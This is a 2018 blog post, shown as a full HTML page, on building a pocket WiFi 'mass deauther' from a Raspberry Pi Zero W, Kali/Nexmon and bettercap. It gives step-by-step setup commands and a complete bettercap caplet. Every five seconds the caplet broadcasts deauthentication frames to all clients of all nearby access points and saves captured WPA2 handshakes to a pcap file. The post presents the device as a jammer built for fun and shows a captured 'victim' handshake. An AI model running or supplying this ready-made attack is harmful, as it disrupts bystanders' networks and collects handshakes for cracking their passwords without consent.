<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W | evilsocket</title>
<meta name="description" content="A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my">


  <link rel="alternate" href="/atom.xml" title="evilsocket" type="application/atom+xml">


<link rel="icon" href="/images/favicon.ico">

<!-- Open Graph -->
<meta property="og:type" content="article">
<meta property="og:title" content="Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W">
<meta property="og:description" content="A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my">
<meta property="og:url" content="/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/">
<meta property="og:site_name" content="evilsocket">

  
  
    <meta property="og:image" content="/images/2018/07/deauth.png">
  


<!-- Twitter Card -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W">
<meta name="twitter:description" content="A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my">

<!-- Schema.org JSON-LD -->


<script type="application/ld+json">
{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/"},"headline":"Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W","description":"A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my","image":"https://www.evilsocket.net/images/2018/07/deauth.png","datePublished":"2018-07-28T17:01:56.000Z","dateModified":"2025-12-19T18:35:53.165Z","author":{"@type":"Person","name":"Simone Margaritelli","description":"Italian cybersecurity researcher, hacker, and open-source developer with over two decades of experience in network security, AI, and offensive security tools.","url":"https://www.evilsocket.net","image":"https://www.evilsocket.net/images/glider.png","sameAs":["https://github.com/evilsocket","https://twitter.com/evilsocket","http://it.linkedin.com/in/simonemargaritelli/","https://www.goodreads.com/evilsocket","https://www.patreon.com/evilsocket","https://keybase.io/evilsocket"],"jobTitle":"Security Researcher","knowsAbout":["Cybersecurity","Penetration Testing","Network Security","Reverse Engineering","Open Source Development","Wireless Security","Machine Learning","Go Programming","Python","C/C++"],"award":["Creator of bettercap","Creator of pwnagotchi","Creator of OpenSnitch","CVE-2024-47176 discoverer"],"worksFor":{"@type":"Organization","name":"Independent"}},"publisher":{"@type":"Organization","name":"evilsocket","url":"https://www.evilsocket.net","logo":{"@type":"ImageObject","url":"https://www.evilsocket.net/images/glider.png"}},"keywords":"bettercap, wifi, ble, portable hacking, wireless security, bluetooth, raspberry, rpi, rpi zero w, rpi0w, kali, deauth, btnap, packet injection, handshake capture, monitor mode","articleSection":"Cybersecurity","inLanguage":"en"}
</script>


<!-- Fonts -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<!-- Styles -->
<link rel="stylesheet" href="/css/style.css">


<!-- Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-22026549-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-22026549-1');
</script>


<meta name="generator" content="Hexo 5.4.2"></head>
<body class="post-page">
  <header class="site-header">
  <div class="header-inner">
    <div class="site-branding">
      <a href="/" class="site-logo">
        
          <img src="/images/glider.png" alt="evilsocket" width="50" height="50">
        
        <div class="site-title-group">
          <span class="site-title">evilsocket</span>
          <span class="site-motto">Preoccupied with a single leaf, you won't see the tree. Preoccupied with a single tree... you'll miss the entire forest.</span>
        </div>
      </a>
    </div>
    
    <nav class="site-nav">
      
        <a href="/" class="nav-link">
          HOME
        </a>
      
        <a href="/atom.xml" class="nav-link">
          RSS
        </a>
      
    </nav>
  </div>
</header>

  
  <main class="main-content">
    <article class="post-full">
  <header class="post-header">
    <h1 class="post-title">Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W</h1>
    <div class="post-meta">
      BY <span class="post-author">Simone Margaritelli</span>
      ‚Äî <time datetime="2018-07-28T17:01:56.000Z">28 Jul 2018</time>
      
        ‚Äî <a href="/tags/bettercap/" class="post-category">bettercap</a>, <a href="/tags/wifi/" class="post-category">wifi</a>, <a href="/tags/ble/" class="post-category">ble</a>, <a href="/tags/portable-hacking/" class="post-category">portable hacking</a>, <a href="/tags/wireless-security/" class="post-category">wireless security</a>, <a href="/tags/bluetooth/" class="post-category">bluetooth</a>, <a href="/tags/raspberry/" class="post-category">raspberry</a>, <a href="/tags/rpi/" class="post-category">rpi</a>, <a href="/tags/rpi-zero-w/" class="post-category">rpi zero w</a>, <a href="/tags/rpi0w/" class="post-category">rpi0w</a>, <a href="/tags/kali/" class="post-category">kali</a>, <a href="/tags/deauth/" class="post-category">deauth</a>, <a href="/tags/btnap/" class="post-category">btnap</a>, <a href="/tags/packet-injection/" class="post-category">packet injection</a>, <a href="/tags/handshake-capture/" class="post-category">handshake capture</a>, <a href="/tags/monitor-mode/" class="post-category">monitor mode</a>
      
    </div>
    <br/>
    <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket" class="twitter-follow-button" data-show-count="false">Follow me on X</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
  </header>

  <div class="post-content">
    <p>A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all the channels in the WiFi spectrum, collects information about the nearby access points and their connected clients and then sends a deauthentication packet to each one of them, resulting in some sort of WiFi jammer on the 802.11 level. As an interesting ‚Äúside effect‚Äù of this jammer (the initial intent was <em>purely for the lulz</em>) is that the more it deauths, the higher the changes to also sniff WPA2 handshakes.</p>
<p>Thanks to the awesome work of the Kali and Nexmon communities in packaging the nexmon drivers and utilities and to the recent changes we released in bettercap, this was very easy to setup and to script and given <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket/status/1021367629901115392">the interest the tweet had</a> I thought to share this writeup :)</p>
<p><img src="/images/2018/07/deauth.png" alt="deauth"></p>
<center><small><i>This awesome case has been designed by <a href="https://twitter.com/elkentaro" target="_blank">@elkentaro</a> and can be found on [his Thingverse page](https://www.thingiverse.com/thing:3018480).</i></small></center>

<span id="more"></span>

<h2 class="heading-anchor" id="0x00-FAQ"><a href="#0x00-FAQ" class="anchor-link" aria-hidden="true">#</a><a href="#0x00-FAQ" class="headerlink" title="[0x00] FAQ"></a>[0x00] FAQ</h2><p><strong>Why not using Nethunter or some other Kali image for Android and a smartphone instead?</strong></p>
<p>Monitor mode works, injection doesn‚Äôt. Using an external WiFi makes the whole thing bigger and kills the battery.</p>
<p><strong>Why not using ‚Ä¶ instead?</strong></p>
<p>There are many alternatives to the setup I‚Äôm going to describe, it‚Äôs not necessarily the best, just the one that works for me.</p>
<p><strong>Why ‚Ä¶?</strong></p>
<p>BECAUSE. The point of this post is not just the hardware, but mostly how to use bettercap to attack wifi.</p>
<h2 class="heading-anchor" id="0x01-Kali-image-and-initial-headless-configuration"><a href="#0x01-Kali-image-and-initial-headless-configuration" class="anchor-link" aria-hidden="true">#</a><a href="#0x01-Kali-image-and-initial-headless-configuration" class="headerlink" title="[0x01] Kali image and initial headless configuration."></a>[0x01] Kali image and initial headless configuration.</h2><p>First thing first, you‚Äôll need to download the <strong>Kali Linux Rpi0w Nexmon</strong> image from <a target="_blank" rel="noopener" href="https://www.offensive-security.com/kali-linux-arm-images/">this page</a> and burn it to the uSD card you‚Äôre going to use for the rpi using the usual <code>dd</code> method, but before unmounting it, we need to enable SSH at boot and configure it to connect to our home WiFi network for the initial configuration, keep in mind this is just temporary and the main wifi interface will be used for packet injection later, while we will be able to connect via bluetooth to the board.</p>
<p>From the computer you used to burn the image on your micro sd, mount it again if needed and then:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># this will enable ssh at boot</span></span><br><span class="line">touch /sd-mount-point/boot/ssh</span><br><span class="line"><span class="comment"># let&#x27;s setup wlan0</span></span><br><span class="line">nano /sd-mount-point/etc/network/interfaces</span><br></pre></td></tr></table></figure>

<p>Fill this file with the following contents:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line"></span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">allow-hotplug wlan0</span><br><span class="line">iface wlan0 inet dhcp</span><br><span class="line">wpa-conf &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf</span><br><span class="line">iface default inet dhcp</span><br></pre></td></tr></table></figure>

<p>Now we‚Äôll add the details of the WiFi network we want the rpi to connect automatically for configuration:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /sd-mount-point/etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure>

<p>And add this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">country&#x3D;GB</span><br><span class="line">ctrl_interface&#x3D;DIR&#x3D;&#x2F;var&#x2F;run&#x2F;wpa_supplicant GROUP&#x3D;netdev</span><br><span class="line">update_config&#x3D;1</span><br><span class="line"></span><br><span class="line">network&#x3D;&#123;</span><br><span class="line">        ssid&#x3D;&quot;YourWiFiName&quot;</span><br><span class="line">        psk&#x3D;&quot;y0urw1f!p455w0rd&quot;</span><br><span class="line">        key_mgmt&#x3D;WPA-PSK</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Reboot the RPI and it should connect to your WiFi, search for its IP address (either by broadcast ping, or using bettercap itself, i usually use the <a target="_blank" rel="noopener" href="https://github.com/bettercap/caplets/blob/master/netmon.cap">netmon</a> caplet to see what‚Äôs going on on my network) and finally SSH to it using the default Kali credentials:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># this will allow you to login with your SSH key instead of a password</span></span><br><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub root@pita-ip</span><br><span class="line">ssh root@pita-ip</span><br></pre></td></tr></table></figure>

<p>Once you‚Äôre logged in:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># always change the default root password</span></span><br><span class="line">passwd</span><br><span class="line"><span class="comment"># regenerate ssh keys</span></span><br><span class="line">ssh-keygen</span><br><span class="line"><span class="comment"># set a nicer hostname :D</span></span><br><span class="line">hostname -b pita</span><br><span class="line"><span class="built_in">echo</span> pita &gt; /etc/hostname</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;127.0.0.1 pita&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="comment"># update the system</span></span><br><span class="line">apt update </span><br><span class="line">apt upgrade</span><br><span class="line"><span class="comment"># install a few useful packages and setup swap</span></span><br><span class="line">apt install git dphys-swapfile</span><br><span class="line"><span class="comment"># set CONF_SWAPSIZE to 1024</span></span><br><span class="line">nano /etc/dphys-swapfile</span><br><span class="line">systemctl <span class="built_in">enable</span> dphys-swapfile</span><br><span class="line"><span class="comment"># set the correct timezone</span></span><br><span class="line">dpkg-reconfigure tzdata</span><br><span class="line"><span class="comment"># reboot to apply the effects</span></span><br><span class="line">reboot```</span><br><span class="line"></span><br><span class="line"><span class="comment">## [0x02] Connecting via Bluetooth with bt-nap</span></span><br><span class="line"></span><br><span class="line">We want to use `wlan0` <span class="keyword">for</span> the monitor mode and injection using Nexmon, meaning we need another way to connect to our board. For this, we can setup the rpi to work as a bt-nap server, basically you will be able to connect via bluetooth and reach it with an IP address on that bluetooth connection, this works both from a laptop and from a smartphone as well.</span><br><span class="line"></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;blockquote class=<span class="string">&quot;twitter-tweet&quot;</span> data-conversation=<span class="string">&quot;none&quot;</span> data-lang=<span class="string">&quot;it&quot;</span>&gt;&lt;p lang=<span class="string">&quot;en&quot;</span> dir=<span class="string">&quot;ltr&quot;</span>&gt;Power from your smartphone, ssh over bluetooth and a mass deauther <span class="keyword">in</span> your pocket üòà&lt;a href=<span class="string">&quot;https://twitter.com/bettercap?ref_src=twsrc%5Etfw&quot;</span>&gt;@bettercap&lt;/a&gt; + &lt;a href=<span class="string">&quot;https://twitter.com/hashtag/pita?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;</span>&gt;<span class="comment">#pita&lt;/a&gt; = ‚ù§Ô∏è &lt;a href=&quot;https://t.co/lDn9Tie3W9&quot;&gt;pic.twitter.com/lDn9Tie3W9&lt;/a&gt;&lt;/p&gt;&amp;mdash; üëΩ (@evilsocket) &lt;a href=&quot;https://twitter.com/evilsocket/status/1021378841749721091?ref_src=twsrc%5Etfw&quot;&gt;23 luglio 2018&lt;/a&gt;&lt;/blockquote&gt;</span></span><br><span class="line">&lt;script async src=<span class="string">&quot;https://platform.twitter.com/widgets.js&quot;</span> charset=<span class="string">&quot;utf-8&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"></span><br><span class="line">Let<span class="string">&#x27;s connect once more via WiFi and SSH:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">```sh</span></span><br><span class="line"><span class="string">ssh root@pita-ip</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># install a few dependencies</span></span><br><span class="line"><span class="string">apt install pulseaudio pulseaudio-module-zeroconf alsa-utils avahi-daemon pulseaudio-module-bluetooth</span></span><br><span class="line"><span class="string">git clone https://github.com/bablokb/pi-btnap.git</span></span><br><span class="line"><span class="string"># install btnap as a server</span></span><br><span class="line"><span class="string">./pi-btnap/tools/install-btnap server</span></span><br></pre></td></tr></table></figure>

<p>Fix the bluetooth configuration file <code>/etc/systemd/system/bluetooth.target.wants/bluetooth.service</code> by disabling the SAP plugin that would break bluetooth, change the <code>ExecStart</code> part with:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;lib&#x2F;bluetooth&#x2F;bluetoothd --noplugin&#x3D;sap</span><br></pre></td></tr></table></figure>

<p>Let‚Äôs set the bluetooth name of your device by editing <code>/etc/bluetooth/main.conf</code> and finally edit the btnap configuration file itself, <code>/etc/btnap.conf</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MODE&#x3D;&quot;server&quot;</span><br><span class="line">BR_DEV&#x3D;&quot;br0&quot;</span><br><span class="line">BR_IP&#x3D;&quot;192.168.20.99&#x2F;24&quot;</span><br><span class="line">BR_GW&#x3D;&quot;192.168.20.1&quot; </span><br><span class="line">ADD_IF&#x3D;&quot;lo&quot; </span><br><span class="line">REMOTE_DEV&#x3D;&quot;&quot; </span><br><span class="line">DEBUG&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>Enable all the services at boot and restart them:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> bluetooth</span><br><span class="line">systemctl <span class="built_in">enable</span> btnap</span><br><span class="line">systemctl <span class="built_in">enable</span> dnsmasq</span><br><span class="line"></span><br><span class="line">service bluetooth restart</span><br><span class="line">service dnsmasq restart</span><br><span class="line">service btnap restart</span><br></pre></td></tr></table></figure>

<p>Before being able to connect via bluetooth, we need to manually pair and trust the device we‚Äôre going to use (remember to repeat this step for every new device you want to allow to connect to the PITA board), make sure your control device (your laptop for instance) has bluetooth enabled and it‚Äôs visible, then from the pita:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bluetoothctl</span><br><span class="line">&gt; agent on</span><br><span class="line">&gt; scan on</span><br><span class="line">... <span class="built_in">wait</span> <span class="keyword">for</span> your device to show up ...</span><br><span class="line">...</span><br><span class="line">... now pair with its address</span><br><span class="line">&gt; pair aa:bb:cc:dd:ee:ff</span><br><span class="line">... and trust it permantently ...</span><br><span class="line">&gt; trust aa:bb:cc:dd:ee:ff</span><br><span class="line">... <span class="built_in">wait</span> ...</span><br><span class="line">&gt; quit</span><br></pre></td></tr></table></figure>

<p>We‚Äôre now ready to ‚Äúfree‚Äù the wlan0 interface and use it for more cool stuff, let‚Äôs change the file <code>/etc/network/interfaces</code> to:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">allow-hotplug wlan0</span><br><span class="line">iface wlan0 inet static</span><br></pre></td></tr></table></figure>

<p>From the board now, disable wpa_supplicant and reboot:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service wpa_supplicant <span class="built_in">disable</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<p>After reboot, you‚Äôll be able to connect to the board via bluetooth.</p>
<p><img src="/images/2018/07/bt.png" alt="bt"></p>
<p>Your system (this depends on the system you‚Äôre using, on most GNU/Linux distributions and Android this is basically automatically detected) should now have a new DHCP based <code>Pita Network</code> entry in the network manager:</p>
<p><img src="/images/2018/07/net1.png" alt="pita network"></p>
<p>Once connected, you should see a new <code>bnep0</code> network interface:</p>
<p><img src="/images/2018/07/net2.png" alt="ifconfig"></p>
<p>You can finally ssh to your PITA board via bluetooth now :)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;192.168.20.99 pita&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line">ssh root@pita</span><br></pre></td></tr></table></figure>

<h2 class="heading-anchor" id="0x03-Having-fun-with-wlan0-and-bettercap"><a href="#0x03-Having-fun-with-wlan0-and-bettercap" class="anchor-link" aria-hidden="true">#</a><a href="#0x03-Having-fun-with-wlan0-and-bettercap" class="headerlink" title="[0x03] Having fun with wlan0 and bettercap"></a>[0x03] Having fun with wlan0 and bettercap</h2><p><strong>IMPORTANT</strong></p>
<p><strong>In order to install bettercap and download the caplet, you will need internet connectivity on the rpi, but we just freed wlan0 for injection, so you‚Äôll either have to plug some ethernet adapter, smartphone in tethering mode, etc on the mini usb port now, or perform these steps while the board is still connected to your WiFi during section 0x01.</strong></p>
<p>Now that we can power our board either from a powerbank or the smartphone itself and we can connect to it via SSH over bluetooth, the next step is to install bettercap itself, we will compile it directly on the PITA, it‚Äôll take a while but it‚Äôs very easy:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">apt install golang libpcap-dev libnetfilter-queue-dev wget build-essential</span><br><span class="line"><span class="comment"># you should make this persistent in your .bashrc or .zshrc file</span></span><br><span class="line"><span class="built_in">export</span> GOPATH=/root/gocode</span><br><span class="line">mkdir -p <span class="variable">$GOPATH</span></span><br><span class="line">go get github.com/bettercap/bettercap</span><br><span class="line"><span class="comment"># wait</span></span><br><span class="line"><span class="comment"># let&#x27;s install it for everyone to enjoy ^_^</span></span><br><span class="line"><span class="built_in">cd</span> /root/gocode/src/github.com/bettercap/bettercap</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"><span class="comment"># let&#x27;s download the pita.cap caplet</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/bettercap/caplets/</span><br><span class="line">wget <span class="string">&quot;https://raw.githubusercontent.com/bettercap/caplets/master/pita.cap&quot;</span></span><br></pre></td></tr></table></figure>

<p>The <a target="_blank" rel="noopener" href="https://github.com/bettercap/caplets/blob/master/pita.cap">pita.cap</a> caplet will take care of starting wlan0 in monitor mode, periodically send deauth packets and also sniffing for WPA2 handshakes as they arrive, you can launch it and keep it persistent with something like screen or tmux. It is a basic example of what you can do now, many other functionalities can be found in the <a target="_blank" rel="noopener" href="https://github.com/bettercap/caplets">caplets repo</a> and generally in the project <a target="_blank" rel="noopener" href="https://github.com/bettercap/bettercap/wiki">wiki</a>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># More info about this caplet: https:&#x2F;&#x2F;twitter.com&#x2F;evilsocket&#x2F;status&#x2F;1021367629901115392</span><br><span class="line"></span><br><span class="line">set $ &#123;bold&#125;üòà ¬ª &#123;reset&#125;</span><br><span class="line"></span><br><span class="line"># make sure wlan0 is in monitor mode</span><br><span class="line"># ref: https:&#x2F;&#x2F;github.com&#x2F;offensive-security&#x2F;kali-arm-build-scripts&#x2F;blob&#x2F;master&#x2F;rpi3-nexmon.sh</span><br><span class="line">!monstop</span><br><span class="line">!monstart</span><br><span class="line"></span><br><span class="line"># every 5 seconds:</span><br><span class="line"># - clear the screen</span><br><span class="line"># - show the list of nearby access points </span><br><span class="line"># - deauth every client from each one of them</span><br><span class="line">set ticker.period 5</span><br><span class="line">set ticker.commands clear; wifi.show; wifi.deauth ff:ff:ff:ff:ff:ff</span><br><span class="line"># sniff EAPOL frames ( WPA handshakes ) and save them to a pcap file.</span><br><span class="line">set net.sniff.verbose true</span><br><span class="line">set net.sniff.filter ether proto 0x888e</span><br><span class="line">set net.sniff.output wpa.pcap</span><br><span class="line"></span><br><span class="line"># uncomment to only hop on these channels:</span><br><span class="line"># wifi.recon.channel 1,2,3</span><br><span class="line">wifi.recon on</span><br><span class="line">ticker on</span><br><span class="line">net.sniff on</span><br><span class="line"></span><br><span class="line"># we&#39;ll see lots of probes after each deauth, just skip the noise ...</span><br><span class="line">events.ignore wifi.client.probe</span><br><span class="line"># start fresh</span><br><span class="line">events.clear</span><br><span class="line">clear</span><br></pre></td></tr></table></figure>

<p>To start bettercap with this caplet:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0 up</span><br><span class="line">bettercap -iface wlan0 -caplet /usr/share/bettercap/caplets/pita.cap</span><br><span class="line"><span class="comment"># enjoy ^_^</span></span><br></pre></td></tr></table></figure>

<p>Just after a few minutes my prototype was able to deauth and capture the handshake of some device:</p>
<p><img src="/images/2018/07/victim.png" alt="victim"></p>
<p>I hope I did not forget about any step, the btnep part specifically was a little bit tricky to setup, let me know in the comments if something doesn‚Äôt work for you and I‚Äôll try to help and fix this writeup, as usual, <strong>enjoy!</strong></p>
<center>
<img src="https://abs.twimg.com/emoji/v2/72x72/1f984.png"/>
</center>

  </div>

  
    <div class="post-tags">
      
        <a href="/tags/bettercap/" class="tag">#bettercap</a>
      
        <a href="/tags/wifi/" class="tag">#wifi</a>
      
        <a href="/tags/ble/" class="tag">#ble</a>
      
        <a href="/tags/portable-hacking/" class="tag">#portable hacking</a>
      
        <a href="/tags/wireless-security/" class="tag">#wireless security</a>
      
        <a href="/tags/bluetooth/" class="tag">#bluetooth</a>
      
        <a href="/tags/raspberry/" class="tag">#raspberry</a>
      
        <a href="/tags/rpi/" class="tag">#rpi</a>
      
        <a href="/tags/rpi-zero-w/" class="tag">#rpi zero w</a>
      
        <a href="/tags/rpi0w/" class="tag">#rpi0w</a>
      
        <a href="/tags/kali/" class="tag">#kali</a>
      
        <a href="/tags/deauth/" class="tag">#deauth</a>
      
        <a href="/tags/btnap/" class="tag">#btnap</a>
      
        <a href="/tags/packet-injection/" class="tag">#packet injection</a>
      
        <a href="/tags/handshake-capture/" class="tag">#handshake capture</a>
      
        <a href="/tags/monitor-mode/" class="tag">#monitor mode</a>
      
    </div>
  

  <nav class="post-navigation">
    
      <a href="/2018/11/22/Presenting-project-Ergo-how-to-build-an-airplane-detector-for-satellite-imagery-with-Deep-Learning/" class="nav-prev">
        <span class="nav-label">PREVIOUS</span>
        <span class="nav-title">Presenting Project Ergo: How to Build an Airplane Detector for Satellite Imagery With Deep Learning</span>
      </a>
    
    
      <a href="/2018/03/14/Go-is-amazing-so-here-s-what-i-don-t-like-about-it/" class="nav-next">
        <span class="nav-label">NEXT</span>
        <span class="nav-title">Go Is Amazing, So Here&#39;s What I Don&#39;t Like About It</span>
      </a>
    
  </nav>
</article>


  


<section class="related-posts">
  <h2 class="related-title">YOU MIGHT ALSO LIKE...</h2>
  <div class="cards-grid cards-grid-related">
    
      

<article class="card card-light">
  <a href="/2024/09/13/Introducing-bettercap-2-4-0-CAN-bus-hacking-WiFi-bruteforcing-and-builtin-web-UI/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2024/ecus.png')">
        
      </div>
    
    
    
      <div class="card-content">
        <h2 class="card-title">Introducing Bettercap 2.4.0: CAN-Bus Hacking, WiFi Bruteforcing and Builtin Web UI</h2>
        
        <div class="card-footer">
          <span class="card-read-more">READ MORE</span>
        </div>
      </div>
    
  </a>
</article>

    
      

<article class="card card-overlay">
  <a href="/2019/10/19/Weaponizing-and-Gamifying-AI-for-WiFi-Hacking-Presenting-Pwnagotchi-1-0-0/" class="card-link">
    
      <div class="card-image" style="background-image: url('https://i.imgur.com/X68GXrn.png')">
        
          <div class="card-overlay-content">
            <h2 class="card-title">Weaponizing and Gamifying AI for WiFi Hacking: Presenting Pwnagotchi 1.0.0</h2>
            <span class="card-read-more">READ MORE</span>
          </div>
        
      </div>
    
    
    
  </a>
</article>

    
      

<article class="card card-overlay">
  <a href="/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/" class="card-link">
    
      <div class="card-image" style="background-image: url('https://raw.githubusercontent.com/bettercap/media/master/logo.png')">
        
          <div class="card-overlay-content">
            <h2 class="card-title">Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less Attack</h2>
            <span class="card-read-more">READ MORE</span>
          </div>
        
      </div>
    
    
    
  </a>
</article>

    
      

<article class="card card-light">
  <a href="/2018/02/27/All-hail-bettercap-2-0-one-tool-to-rule-them-all/" class="card-link">
    
      <div class="card-image" style="background-image: url('https://www.bettercap.org/img/logo.png')">
        
      </div>
    
    
    
      <div class="card-content">
        <h2 class="card-title">All Hail Bettercap 2.0, One Tool to Rule Them All.</h2>
        
